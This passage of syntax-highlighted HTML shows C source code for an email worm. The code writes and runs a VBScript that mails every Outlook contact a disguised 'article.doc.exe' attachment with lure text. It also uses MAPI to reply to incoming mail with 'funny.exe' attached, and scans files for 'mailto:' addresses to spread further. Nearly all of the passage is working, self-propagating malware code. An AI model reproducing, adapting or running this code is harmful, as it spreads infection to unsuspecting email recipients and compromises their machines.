</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"On Error Resume Next\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"msgbox %cScripting.FileSystemObject%c\n"</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"Set sf=CreateObject(%cScripting.FileSystemObject%c)\n"</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"Set sys=sf.GetSpecialFolder(1)\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"Set OA=CreateObject(%cOutlook.Application%c)\n"</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"Set MA=OA.GetNameSpace(%cMAPI%c)\n"</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"For Each C In MA.AddressLists\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"If C.AddressEntries.Count &lt;&gt; 0 Then\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"For D=1 To C.AddressEntries.Count\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"Set AD=C.AddressEntries(D)\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"Set EM=OA.CreateItem(0)\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"EM.To=AD.Address\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"EM.Subject=%cHi %c&amp;AD.Name&amp;%c read this.%c\n"</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"body=%cI found this on the web and it is important.%c\n"</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"body = body &amp; VbCrLf &amp; %cOpen the attached file and read.%c\n"</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"EM.Body=body\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"EM.Attachments.Add(sys&amp;%c\\article.doc.exe%c)\n"</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"EM.DeleteAfterSubmit=True\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"If EM.To &lt;&gt; %c%c Then\n"</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">,</span><span class="sc4">34</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"EM.Send\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"End If\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"Next\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"End If\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">,</span><span class="sc6">"Next\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">vbsworm</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc6">"wargames.vbs"</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SW_SHOWNORMAL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">5000</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"wargames.vbs"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mLogon</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogon"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mLogoff</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogoff"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mFindNext</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFindNext"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mReadMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIReadMail"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mFreeBuffer</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFreeBuffer"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mLogon</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_NEW_SESSION</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">session</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mFindNext</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mReadMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_ENVELOPE_ONLY</span><span class="sc10">|</span><span class="sc11">MAPI_PEEK</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">mes</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">mname</span><span class="sc10">,</span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">maddr</span><span class="sc10">,</span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc6">"Re: Fw:"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc6">"I received your mail but I cannot reply immediatly.\n"</span><span class="sc0">
                </span><span class="sc6">"I send you a nice program. Look at this.\n\n"</span><span class="sc0">
                </span><span class="sc6">"   See you soon."</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpszMessageType</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpszDateReceived</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpszConversationID</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">flFlags</span><span class="sc10">=</span><span class="sc11">MAPI_SENT</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_ORIG</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">nRecipCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">mname</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">maddr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">nFileCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">=(</span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">flFlags</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">nPosition</span><span class="sc10">=-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">filename</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc6">"funny.exe"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpFileType</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mSendMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">mFindNext</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mFreeBuffer</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mLogoff</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">FindFile</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">folder</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ext</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">abc</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">SetCurrentDirectory</span><span class="sc10">(</span><span class="sc11">folder</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">hFile</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">ext</span><span class="sc10">,&amp;</span><span class="sc11">ffile</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">!=</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">abc</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">SetFileAttributes</span><span class="sc10">(</span><span class="sc11">ffile</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc11">ffile</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc11">mail</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">mail</span><span class="sc10">)&gt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">sendmail</span><span class="sc10">(</span><span class="sc11">mail</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">abc</span><span class="sc10">=</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hFile</span><span class="sc10">,&amp;</span><span class="sc11">ffile</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">namefile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mail</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0">  </span><span class="sc11">hf</span><span class="sc10">,</span><span class="sc11">hf2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0">    </span><span class="sc10">*</span><span class="sc11">mapped</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0">   </span><span class="sc11">size</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">k</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0">    </span><span class="sc11">test</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">hf</span><span class="sc10">=</span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">namefile</span><span class="sc10">,</span><span class="sc11">GENERIC_READ</span><span class="sc10">,</span><span class="sc11">FILE_SHARE_READ</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">==</span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">size</span><span class="sc10">=</span><span class="sc11">GetFileSize</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">size</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">size</span><span class="sc10">&lt;</span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">size</span><span class="sc10">-=</span><span class="sc4">100</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">hf2</span><span class="sc10">=</span><span class="sc11">CreateFileMapping</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">PAGE_READONLY</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">hf2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">mapped</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">MapViewOfFile</span><span class="sc10">(</span><span class="sc11">hf2</span><span class="sc10">,</span><span class="sc11">FILE_MAP_READ</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mapped</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hf2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">test</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">strncmpi</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">,</span><span class="sc11">mapped</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">test</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc10">+=</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc6">"mailto:"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">34</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">39</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc4">127</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc7">' '</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]==</span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">valid</span><span class="sc10">=</span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc11">k</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">valid</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">mail</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">UnmapViewOfFile</span><span class="sc10">(</span><span class="sc11">mapped</span><span class="sc10">);</span><span class="sc0">
